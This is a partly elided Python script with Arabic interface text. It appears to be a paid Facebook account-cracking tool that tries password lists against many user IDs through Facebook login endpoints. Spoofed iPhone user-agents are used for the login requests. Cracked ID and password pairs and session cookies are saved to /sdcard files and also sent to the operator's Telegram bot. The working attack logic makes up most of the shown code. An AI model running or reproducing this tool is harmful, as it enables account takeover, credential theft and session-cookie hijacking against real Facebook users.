...
print ('         يتم تجهيز لاداه يرجا الانتضار ')
print('\x1b[1;34m' '                                    _'*25)
...
token = input('INTER TOKEN BOT : ')
print('\n')
ID = input('INTER ID TELE : ')
print('                         ꧁꧂'*25)
print(        'انتضر يتم تشغيل لاداه ')
tlg1 = '''
___________________
يمنع بيع لاداه 
الاداه مدفوعه 
الاداه بحقوق المبرمج العنيف
___________________
للشتراك♕  @aapper
'''
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        #clear()
                        print('\x1b[1;32m''[01]  صيد من ملف :  ')
                        linex()
                        xd=input('\x1b[1;32m'' اختار > ')
                        if xd in ['1','01']:
                               
                                linex()
                                file = input('\x1b[1;32m''  ادخل مسار ملفك  :  ')
                                try:
                                        ...
                                        menu()
                                linex()
                                print('\x1b[1;32m'' [1] الغاء حظر جهاز او تبديل ip :  ')
                                linex()
                                mthd=input('اختار    : ')
                                linex()
                                plist = []
                                print('\x1b[1;32m''[01]  باسورد من لاداه  : ');linex()
                                print('\x1b[1;32m''[2]  باسورد اختياري  : ')
                                ppp=input('\x1b[1;32m'' اختار  : ')
                                if ppp in ['1','01']:
...
⣿⣷⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣤⣤::'''
        ...
        sys.stdout.write(' [%s]/[OK]/[%s] [%s%%]'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [programmer-OK] %s | %s'%(ids,pas))
                                dynoOK= f'''
OK
___________________
...
@aapper
'''
                                dynoOK1 = nel(dynoOK, style='red')
                                cetak(nel(dynoOK1, title='OK'))
                                requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(dynoCP))     
                                open('OK/'+cp,'a').write(ids+'|'+pas+'\n')
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/programmer-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/programmer-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
...
@aapper
'''
                                        dynoCP1 = nel(dynoCP, style='red')
                                        cetak(nel(dynoCP1, title='CP'))
                                        requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(dynoCP))     
                                        open('CP/'+cp,'a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/programmer-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [programmer] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [programmer-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/programmer-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [programmer-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/programmer-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/programmerCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [programmer-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/programmer-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/programmer_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [programmer-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/programmer-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
